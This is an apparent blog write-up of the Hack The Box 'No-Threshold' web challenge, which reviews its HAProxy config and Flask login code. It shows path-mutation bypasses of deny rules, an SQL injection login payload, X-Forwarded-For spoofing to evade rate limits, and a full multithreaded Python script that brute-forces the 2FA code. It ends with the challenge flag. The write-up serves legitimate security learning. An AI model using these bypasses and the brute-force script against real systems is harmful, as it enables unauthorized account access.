---
title: "No-Threshold - HackTheBox"
description: "https://app.hackthebox.com/challenges/No-Threshold"
summary: "Hack The Box Web Challenge No-Threshold"
date: 2024-09-01
draft: true
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["HackTheBox", "CTF", "Web", "SQLi"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
# weight: 1
# aliases: ["/first"]
hidemeta: false
comments: true
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
---

------------------------

### Challenge Description

Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.🔮🎩

### Source Code Review

In the `haproxy.cfg` file, we notice few things.

#### Bypass blocked access to login

```cfg
# External users should be blocked from accessing routes under maintenance.
    http-request deny if { path_beg /auth/login }
```

Access to the path that starts with `/auth/login` is blocked. This can be easily bypassed with mutations like `//auth/login` or `/xx/../auth/login`.

URLs are often normalized by web servers, so both of them will resolve to `/auth/login`.

#### Bypass blocked access to verify-2fa

```cfg
    # Parse the X-Forwarded-For header value if it exists. If it doesn't exist, add the client's IP address to the X-Forwarded-For header. 
    http-request add-header X-Forwarded-For %[src] if !{ req.hdr(X-Forwarded-For) -m found }
    
    # Apply rate limit on the /auth/verify-2fa route.
    acl is_auth_verify_2fa path_beg,url_dec /auth/verify-2fa

    # Checks for valid IPv4 address in X-Forwarded-For header and denies request if malformed IPv4 is found. (Application accepts IP addresses in the range from 0.0.0.0 to 255.255.255.255.)
    acl valid_ipv4 req.hdr(X-Forwarded-For) -m reg ^([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])$
    
    http-request deny deny_status 400 if is_auth_verify_2fa !valid_ipv4

    # Crate a stick-table to track the number of requests from a single IP address. (1min expire)
    stick-table type ip size 100k expire 60s store http_req_rate(60s)

    # Deny users that make more than 20 requests in a small timeframe.
    http-request track-sc0 hdr(X-Forwarded-For) if is_auth_verify_2fa
    http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }

    # External users should be blocked from accessing routes under maintenance.
    http-request deny if { path_beg /auth/login }
```

This will keep track of the number of requests made to the `/auth/verify-2fa` endpoint from the IP based on the `X-Forwarded-For` header. It will deny requests to `/auth/verify-2fa` with a 429 status if the request rate exceeds 20 requests per minute per IP.

This can also be easily bypassed by using path mutations. or we can use `X-Forwarded-For` to use multiple IPs. 20 requests per IP, so we will need 500 IPs to bruteforce a 4-digit code.

#### SQL injection in login

In `login.py` we notice that username AND password are directly appended to the SQLite query. That's right, we have SQL injection here!

```python
user = query_db(
                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
                one=True,
            )
```
If we successfully login, it will set a 4-digit 2FA code.
```python
            set_2fa_code(4)
```

```python
def set_2fa_code(d):
    uwsgi.cache_del("2fa-code")
    uwsgi.cache_set(
        "2fa-code", "".join(random.choices(string.digits, k=d)), 300 # valid for 5 min
    )
```

### Get The Flag

If we successfully login and verify the 2FA, then it will redirect to `/dashboard` and return the flag.
Simple enough, let's try it.

To login successfully we can use simple payload like `' OR 1=1 OR 'x'='x` in the username field.

![Login via SQLi](files/sqli-login.png#center)

Now send it to the intruder and bruteforce a 4-digit code for the `//auth/verify-2fa` endpoint.

![Intruder 2fa result](files/intruder-2fa-bruteforce.png#center)

![Flag at Dashboard endpoint](files/dashboard-endpoint.png#center)

Alternatively, we can bruteforce 2FA code through multiple IP addresses via the `X-Forwarded-For` header.

Below Python code automates that process:

```python
import os
import re
import sys
import threading
import requests


n1, n2, n3, n4 = 1, 0, 0, 0
ips = dict()
url = "http://94.237.59.199:48823"


def get_ip(x):
    global n1, n2, n3, n4, url
    for x2 in range(x, x + 10):
        if n4 < 255:
            n4 += 1
        elif n3 < 255:
            n3 += 1
        elif n2 < 255:
            n2 += 1
        elif n1 < 255:
            n1 += 1
        ip = f"{n1}.{n2}.{n3}.{n4}"
        headers = {
            "X-Forwarded-For": ip,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        response = requests.post(
            f"{url}//x/../auth/login",
            data="username='+OR+1263%3d1263+OR+'RzWd'%3d'OrZt&password=cycAEGAv4OapKYasrIa2vuguAnSgwib5",
            headers=headers,
            proxies={"http": "http://127.0.0.1:8080/"},
            allow_redirects=False,
        )
        if "verify-2fa" not in response.text:
            print(response.text)
            sys.exit("no 2fa!!")
        ips[x2] = ip
        pass
    pass


def brute_force(start, end, ip):
    for i in range(start, end):
        headers = {
            "X-Forwarded-For": ip,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        response = requests.post(
            f"{url}/auth/verify-2fa",
            data=f"2fa-code={i:04}",
            headers=headers,
            proxies={"http": "http://127.0.0.1:8080/"},
        )
        if "flag" in response.text:
            print("IP:", ip)
            matches = re.findall(r"HTB\{(.*?)\}", response.text)
            if matches:
                for match in matches:
                    print("Flag Found: HTB{", match, "}", sep="")
            else:
                print(response.text)
            os._exit(0)
        pass


num_threads = 500
total_numbers = 10000
chunk_size = total_numbers // num_threads
threads = []
threads2 = []
for x in range(50):
    t = threading.Thread(target=get_ip, args=(x * 10,))
    threads2.append(t)
    t.start()
    pass
for t in threads2:
    t.join()

print(f"Total ip: {len(ips)}")
for i in range(num_threads):
    start = i * chunk_size
    end = start + chunk_size
    thread = threading.Thread(target=brute_force, args=(start, end, ips[i]))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Brute force completed.")
```

Code output:

![Python code output](files/python-code-output.png#center)

Flag: `HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}`

Happy Hacking
